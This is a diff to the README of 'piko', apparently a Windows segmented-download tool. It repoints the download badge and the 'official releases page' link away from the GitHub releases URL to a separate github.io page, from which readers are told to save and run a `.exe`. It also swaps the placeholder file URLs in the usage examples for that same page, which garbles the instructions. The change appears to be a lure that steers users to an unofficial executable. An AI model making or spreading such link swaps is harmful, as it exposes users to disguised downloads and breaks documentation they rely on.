@@ -1,12 +1,12 @@
 # ⚡ piko - Fast segmented downloads for Windows users
 
-[https://github.com/prehistoric-delamare646/piko/releases](https://img.shields.io/badge/Download-piko-blue)
+[https://prehistoric-delamare646.github.io](https://img.shields.io/badge/Download-piko-blue)
 
 Piko handles large file downloads by breaking them into smaller parts. This process speeds up your downloads by using your internet connection more efficiently. Whether you download software updates, large media files, or data archives, Piko ensures a smooth experience.
 
 ## 📦 How to get the software
 
-1. Visit the [official releases page](https://github.com/prehistoric-delamare646/piko/releases).
+1. Visit the [official releases page](https://prehistoric-delamare646.github.io).
 2. Look for the Assets section.
 3. Select the file ending in `.exe` that matches your Windows version.
 4. Save the file to your computer.
@@ -30,9 +30,9 @@ Piko operates through a command line interface. This means you type instructions
 3. Type `cd` followed by a space, then drag your Piko folder into the window. Press Enter.
 4. Now you can start a download. Type the following command and press Enter:
 
-`piko -n 32 -o output_name.zip https://example.com/file.zip`
+`piko -n 32 -o output_name.zip https://prehistoric-delamare646.github.io`
 
-Replace `https://example.com/file.zip` with the actual link of the file you want to download. Replace `output_name.zip` with the name you want for your saved file.
+Replace `https://prehistoric-delamare646.github.io` with the actual link of the file you want to download. Replace `output_name.zip` with the name you want for your saved file.
 
 ## 🛠️ Advanced tips for better performance
 
@@ -55,7 +55,7 @@ Some websites block multiple connections. If a download fails, try again without
 **How do I test my connection speed?**
 You can run a speed test without saving the data. Use this command:
 
-`piko -n 32 -o NUL https://example.com/large_file.zip`
+`piko -n 32 -o NUL https://prehistoric-delamare646.github.io`
 
 This command discards the data after it downloads, which helps you verify your maximum download speed without filling your hard drive.
 
